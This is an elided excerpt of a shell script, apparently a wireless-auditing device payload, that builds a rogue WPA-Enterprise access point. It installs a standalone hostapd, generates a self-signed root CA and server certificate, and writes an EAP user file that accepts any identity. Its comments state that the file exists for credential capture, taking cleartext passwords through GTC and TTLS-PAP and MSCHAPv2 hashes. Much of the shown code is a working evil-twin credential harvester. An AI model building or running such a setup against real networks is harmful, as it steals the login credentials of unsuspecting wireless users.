...
check_deps() {
    ...
    if opkg list-installed 2>/dev/null | grep -q "wpad-openssl\|hostapd-openssl"; then
        ...
        resp=$(CONFIRMATION_DIALOG "EAP support is missing.\n\nDownload standalone hostapd?\n\nThis is SAFE and will NOT\nmodify your system packages.")
        ...
        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            ...
            if [ -f "./usr/sbin/hostapd" ]; then
                ...
                if ! command -v ldd >/dev/null 2>&1; then
                    # Most OpenWrt systems use 'objdump -p' or just check files
                    logboth "      - Verifying libraries..."
                else
                    if ldd "$HOSTAPD_BIN" 2>/dev/null | grep -q "not found"; then
                        logboth yellow "      - Missing libraries detected"
                        logboth yellow "      - Attempting to install libopenssl..."
                        opkg install libopenssl >/dev/null 2>&1
                    fi
                fi
            else
            ...
            logboth red "      - User declined standalone hostapd"
            ERROR_DIALOG "Standalone hostapd\nis required"
            return 1
        fi
    fi
...
EOF
    ...
    openssl req -x509 -new -nodes -key "$CERT_DIR/ca.key" \
        -days "$CERT_DAYS" -out "$CERT_DIR/ca.pem" \
        -subj "/C=US/ST=State/L=City/O=$CERT_ORG/CN=Internal Root CA" \
        -config "$TEMP_DIR/openssl.conf" -extensions v3_ca 2>/dev/null
    ...
    openssl req -new -key "$CERT_DIR/server.key" \
        ...
        -config "$TEMP_DIR/openssl.conf" 2>/dev/null
    ...
    openssl x509 -req -in "$CERT_DIR/server.csr" \
        ...
        -days "$CERT_DAYS" -extfile "$TEMP_DIR/openssl.conf" \
...
create_virtual_interface() {
    ...
    # Kill any existing hostapd that might be holding the interface
    pkill -f "hostapd.*$VENOM_IFACE" 2>/dev/null
    sleep 1
...
write_eap_user_file() {
    # EAP user file for rogue AP - accept any identity for credential capture
    # Phase 1 = outer tunnel negotiation (PEAP, TTLS, etc)
    # Phase 2 = inner auth (GTC, MSCHAPv2, etc)
    # Note: PAP is often included as TTLS-PAP
    cat > "$EAP_USER_FILE" << 'EAPEOF'
# Phase 1 - Outer Tunnel (any identity matches)
* PEAP,TTLS,TLS,FAST,MD5

# Phase 2 - Inner Auth Methods (match any user)
# We use "password" as a dummy password for MSCHAPv2
# GTC and TTLS-PAP cover cleartext capture
# MSCHAPV2 covers hash capture
* MSCHAPV2,GTC,TTLS-PAP,TTLS-MSCHAPV2 "password" [2]

# Explicit anonymous identity for PEAP
"anonymous" PEAP,TTLS,TLS,FAST [2]
EAPEOF

    if [ -f "$EAP_USER_FILE" ]; then
        logboth green "EAP user file created (Wildcard mode)"
        return 0
    else
